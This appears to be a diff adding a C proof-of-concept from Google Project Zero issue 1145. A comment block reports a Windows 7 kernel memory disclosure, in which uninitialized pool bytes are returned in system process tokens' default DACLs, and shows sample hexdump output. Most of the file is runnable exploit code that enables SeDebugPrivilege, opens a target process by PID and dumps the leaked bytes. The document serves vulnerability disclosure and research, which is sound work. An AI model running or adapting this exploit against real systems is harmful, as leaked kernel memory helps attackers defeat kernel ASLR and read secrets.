@@ -1,0 +1,241 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1145
+
+We have observed (on Windows 7 32-bit) that for unclear reasons, the kernel-mode structure containing the default DACL of system processes' tokens (lsass.exe, services.exe, ...) has 8 uninitialized bytes at the end, as the size of the structure (ACL.AclSize) is larger than the sum of ACE lengths (ACE_HEADER.AceSize). It is possible to read the leftover pool data using a GetTokenInformation(TokenDefaultDacl) call.
+
+When the attached proof-of-concept code is run against a SYSTEM process (pid of the process must be passed in the program argument), on a system with Special Pools enabled for ntoskrnl.exe, output similar to the following can be observed:
+
+>NtQueryInformationToken.exe 520
+00000000: 54 bf 2b 00 02 00 3c 00 02 00 00 00 00 00 14 00 T.+...<.........
+00000010: 00 00 00 10 01 01 00 00 00 00 00 05 12 00 00 00 ................
+00000020: 00 00 18 00 00 00 02 a0 01 02 00 00 00 00 00 05 ................
+00000030: 20 00 00 00 20 02 00 00[01 01 01 01 01 01 01 01] ... ...........
+
+The last eight 0x01 bytes are markers inserted by Special Pools, which visibly haven't been overwritten by any actual data prior to being returned to user-mode.
+
+While reading DACLs of system processes may require special privileges (such as the ability to acquire SeDebugPrivilege), the root cause of the behavior could potentially make it possible to also create uninitialized DACLs that are easily accessible by regular users. This could in turn lead to a typical kernel memory disclosure condition, which would allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space. Since it's not clear to us what causes the abberant behavior, we're reporting it for further analysis to be on the safe side.
+
+The proof-of-concept code is mostly based on the example at https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege.
+*/
+
+#define RTN_OK 0
+#define RTN_USAGE 1
+#define RTN_ERROR 13
+
+#include <windows.h>
+#include <stdio.h>
+
+BOOL SetPrivilege(
+  HANDLE hToken,          // token handle
+  LPCTSTR Privilege,      // Privilege to enable/disable
+  BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
+  );
+
+void DisplayError(LPTSTR szAPI);
+VOID PrintHex(PBYTE Data, ULONG dwBytes);
+
+int main(int argc, char *argv[])
+{
+  HANDLE hProcess;
+  HANDLE hToken;
+  int dwRetVal = RTN_OK; // assume success from main()
+
+  // show correct usage for kill
+  if (argc != 2)
+  {
+    fprintf(stderr, "Usage: %s [ProcessId]\n", argv[0]);
+    return RTN_USAGE;
+  }
+
+  if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
+  {
+    if (GetLastError() == ERROR_NO_TOKEN)
+    {
+      if (!ImpersonateSelf(SecurityImpersonation))
+        return RTN_ERROR;
+
+      if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)){
+        DisplayError(L"OpenThreadToken");
+        return RTN_ERROR;
+      }
+    }
+    else
+      return RTN_ERROR;
+  }
+
+  // enable SeDebugPrivilege
+  if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
+  {
+    DisplayError(L"SetPrivilege");
+
+    // close token handle
+    CloseHandle(hToken);
+
+    // indicate failure
+    return RTN_ERROR;
+  }
+  
+  CloseHandle(hToken);
+
+  // open the process
+  if ((hProcess = OpenProcess(
+    PROCESS_QUERY_INFORMATION,
+    FALSE,
+    atoi(argv[1]) // PID from commandline
+    )) == NULL)
+  {
+    DisplayError(L"OpenProcess");
+    return RTN_ERROR;
+  }
+
+  // Open process token.
+  if (!OpenProcessToken(hProcess, TOKEN_READ, &hToken)) {
+    DisplayError(L"OpenProcessToken");
+    return RTN_ERROR;
+  }
+
+  DWORD ReturnLength = 0;
+  if (!GetTokenInformation(hToken, TokenDefaultDacl, NULL, 0, &ReturnLength) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+    DisplayError(L"GetTokenInformation #1");
+    return RTN_ERROR;
+  }
+
+  PBYTE OutputBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);
+  if (!GetTokenInformation(hToken, TokenDefaultDacl, OutputBuffer, ReturnLength, &ReturnLength)) {
+    DisplayError(L"GetTokenInformation #2");
+    return RTN_ERROR;
+  }
+
+  PrintHex(OutputBuffer, ReturnLength);
+
+  // close handles
+  HeapFree(GetProcessHeap(), 0, OutputBuffer);
+  CloseHandle(hProcess);
+
+  return dwRetVal;
+}
+
+BOOL SetPrivilege(
+  HANDLE hToken,          // token handle
+  LPCTSTR Privilege,      // Privilege to enable/disable
+  BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
+  )
+{
+  TOKEN_PRIVILEGES tp;
+  LUID luid;
+  TOKEN_PRIVILEGES tpPrevious;
+  DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);
+
+  if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
+
+  // 
+  // first pass.  get current privilege setting
+  // 
+  tp.PrivilegeCount = 1;
+  tp.Privileges[0].Luid = luid;
+  tp.Privileges[0].Attributes = 0;
+
+  AdjustTokenPrivileges(
+    hToken,
+    FALSE,
+    &tp,
+    sizeof(TOKEN_PRIVILEGES),
+    &tpPrevious,
+    &cbPrevious
+    );
+
+  if (GetLastError() != ERROR_SUCCESS) return FALSE;
+
+  // 
+  // second pass.  set privilege based on previous setting
+  // 
+  tpPrevious.PrivilegeCount = 1;
+  tpPrevious.Privileges[0].Luid = luid;
+
+  if (bEnablePrivilege) {
+    tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
+  }
+  else {
+    tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
+      tpPrevious.Privileges[0].Attributes);
+  }
+
+  AdjustTokenPrivileges(
+    hToken,
+    FALSE,
+    &tpPrevious,
+    cbPrevious,
+    NULL,
+    NULL
+    );
+
+  if (GetLastError() != ERROR_SUCCESS) return FALSE;
+
+  return TRUE;
+}
+
+void DisplayError(
+  LPTSTR szAPI    // pointer to failed API name
+  )
+{
+  LPTSTR MessageBuffer;
+  DWORD dwBufferLength;
+
+  fwprintf(stderr, L"%s() error!\n", szAPI);
+
+  if (dwBufferLength = FormatMessage(
+    FORMAT_MESSAGE_ALLOCATE_BUFFER |
+    FORMAT_MESSAGE_FROM_SYSTEM,
+    NULL,
+    GetLastError(),
+    GetSystemDefaultLangID(),
+    (LPTSTR)&MessageBuffer,
+    0,
+    NULL
+    ))
+  {
+    DWORD dwBytesWritten;
+
+    // 
+    // Output message string on stderr
+    // 
+    WriteFile(
+      GetStdHandle(STD_ERROR_HANDLE),
+      MessageBuffer,
+      dwBufferLength,
+      &dwBytesWritten,
+      NULL
+      );
+
+    // 
+    // free the buffer allocated by the system
+    // 
+    LocalFree(MessageBuffer);
+  }
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
